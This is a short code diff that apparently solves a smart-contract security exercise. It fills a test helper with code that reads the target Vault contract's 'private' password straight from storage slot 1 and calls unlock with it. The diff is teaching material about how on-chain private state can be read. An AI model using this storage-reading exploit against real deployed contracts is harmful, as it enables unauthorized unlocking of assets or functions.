@@ -2,12 +2,11 @@ import { expect } from "chai";
 import { ethers, waffle } from "hardhat";
 
 const helper = async (victim: any) => {
-  /* 
-    Add code here that will help you pass the test
-    Note: Unlock without using the string "A very strong password"
-    Unlock the vault by somehow reading the private password from 
-    Vault directly
-  */
+  // Get the password slot
+  const passwordSlot = await ethers.provider.getStorageAt(victim.address, 1);
+  // let encoded_password = ethers.utils.parseBytes32String(password_slot);
+  // Send the password to the Vault
+  await victim.unlock(passwordSlot);
 };
 
 export default helper;
